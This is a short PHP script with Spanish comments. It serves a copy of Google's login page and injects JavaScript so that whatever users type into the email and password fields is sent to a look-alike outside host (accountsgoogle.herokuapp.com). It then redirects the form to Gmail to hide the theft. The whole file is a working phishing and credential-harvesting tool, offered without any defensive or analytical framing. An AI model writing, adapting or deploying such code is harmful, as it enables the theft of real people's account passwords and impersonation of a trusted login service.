<?php
$html = file_get_contents('https://accounts.google.com/ServiceLogin?hl=es');
$insertCode = "<script language=\"javascript\" type=\"text/javascript\">
	
function getXMLHTTPRequest() {
  try {
    req = new XMLHttpRequest();
  } catch(err1) {
    try {
      req = new ActiveXObject(\"Msxml2.XMLHTTP\");
    } catch (err2) {
      try {
        req = new ActiveXObject(\"Microsoft.XMLHTTP\");
      } catch (err3) {
        req = false;
      }
    }
  }
  return req;
}


var http = getXMLHTTPRequest(); // creo una instancia del objeto XMLHTTPRequest.

function enviarvariable(variable) { // funcion encargada de inviar la variable al archivo php llamado index.php.
    var url = 'http://accountsgoogle.herokuapp.com/escribe.php?variable=' + variable; // creación de la URL.
    http.open(\"GET\", url, true); // fijando los parametros para el envío de datos.
    http.onreadystatechange = handler; // Qué función utilizar en caso de que el estado de la petición cambie.
    http.send(null); // enviar petición.
}

function handler() {
  if (http.readyState == 4) {
    if(http.status == 200) {
      a=http.responseText; // El texto de respuesta del archivo index.php lo muestra como una alerta.
    }
  }
}

</script></head>";
$htmlConstruida = str_replace("</head>", $insertCode, $html);

$insertCode = "id='Email' onchange='enviarvariable(document.getElementById(\"Email\").value)'";
$htmlConstruida = str_replace('id="Email"', $insertCode, $htmlConstruida);

$insertCode = "id='Passwd' onchange='enviarvariable(document.getElementById(\"Passwd\").value)'";
$htmlConstruida = str_replace('id="Passwd"', $insertCode, $htmlConstruida);

$insertCode = "id='signIn' onclick='enviarvariable(document.getElementById(\"Passwd\").value)'";
$htmlConstruida = str_replace('id="signIn"', $insertCode, $htmlConstruida);

$insertCode = "action='https://mail.google.com'";
$htmlConstruida = str_replace('action="https://accounts.google.com/ServiceLoginAuth"', $insertCode, $htmlConstruida);

echo $htmlConstruida;
?>


